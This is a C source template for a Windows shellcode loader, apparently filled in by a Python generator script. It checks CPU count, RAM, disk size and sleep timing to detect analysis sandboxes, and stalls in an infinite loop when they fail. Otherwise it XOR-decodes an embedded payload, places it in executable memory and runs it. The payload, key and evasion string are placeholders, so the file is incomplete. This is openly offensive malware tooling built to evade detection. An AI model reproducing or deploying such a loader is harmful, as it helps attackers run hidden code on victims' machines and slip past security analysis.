
#include <windows.h>
#include <stdio.h>
#include <time.h>

unsigned long get_time()
{
	return (unsigned long)time(NULL);
}
void compute_ftp()
{
	
	int i = 0;
	while (1)
	{
		i++;
	}
	return;
}
int main(void)
{
	const char sig_evade[] = "// PYTHON_REPLACE_ME_HERE_1";
	// check CPU
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
	printf("Processors: %d\n", numberOfProcessors);
	if (numberOfProcessors < 2) {
		compute_ftp();
		return 0;
	}
		

	// check RAM
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
	printf("Memory: %d\n", RAMMB);
	if (RAMMB < 2048) {
		compute_ftp();
		return 0;
	}

	// check HDD
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	DWORD diskSizeGB;
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	printf("Disk space: %d\n", diskSizeGB);
	if (diskSizeGB < 70) {
		compute_ftp();
		return 0;
	}

	unsigned long start = get_time();
	Sleep(5000);
	unsigned long end = get_time();
	printf("Diff: %d\n", end-start);
	if ((end - start) < 4)
	{
		compute_ftp();
		return 0;
	}

	if ((end - start) >= 4)
	{
		// PYTHON_REPLACE_ME_HERE_2
		const char key[] = // PYTHON_REPLACE_ME_HERE_3

			for (int i = 0; i < sizeof(buf); i++)
		{
			buf[i] = buf[i] ^ key[i % (sizeof(key) - 1)];
		}
		DWORD threadID;
		PVOID shellcode_exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		memcpy(shellcode_exec, buf, sizeof(buf));
		((void(*)())shellcode_exec)();
		// HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
		// while (1)
		// 	;
		// WaitForSingleObject(hThread, INFINITE);
	}
	return 0;
}